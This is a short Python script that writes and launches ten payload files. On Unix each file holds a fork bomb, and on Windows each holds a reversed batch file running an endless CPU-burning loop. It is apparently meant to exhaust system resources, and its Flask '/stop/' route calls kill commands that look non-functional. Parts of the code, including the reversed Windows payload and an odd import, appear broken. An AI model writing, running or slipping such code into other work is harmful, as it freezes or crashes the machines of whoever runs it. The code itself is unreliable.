import cryptology.discretization as cd
import flask
dr = cd.DiscretizationRandom(65, 122) 
rawResult = dr.get_discretized_random() 
password = ''.join([chr(text) for text in rawResult][:64])[::-1]

unix = '''pgrep -x python >/dev/null && echo "Process found" || :() { :|:& };:'''
win32 = '''
@echo off
setlocal enabledelayedexpansion
set "cmd=tasklist /FI "IMAGENAME eq pythonw.exe" 2^>NUL | find /I /N "pythonw.exe"^>NUL"
%cmd%
if "%ERRORLEVEL%"=="0" (

) else (
    start /MIN cmd /C "for /L %%G in (1,0,1) do (set /A "var=%%G*%%G" & set /A "var=!var!+!var!" & set /A "var=!var!/%%G")"
)
'''[::-1]
from sys import platform
import random,os
random_numbers = [random.randint(10000, 99999) for _ in range(10)]
random_strs = [str(num) for num in random_numbers]
def start():
    for i in range(10):
        if platform == 'win32':
            with open(password + random_strs[i],'w') as f:f.write(win32)
            os.system('start cmd /c {}'.format(password + random_strs[i],'w'))
        else:
            with open(password + random_strs[i],'w') as f:f.write(unix)
            os.system('bash {}'.format(password + random_strs[i],'w'))

app = flask.Flask(__name__)
@app.route('/stop/')
def kill():
    if platform == 'win32':os.system('kill cmd.exe')
    else:os.system('kill ')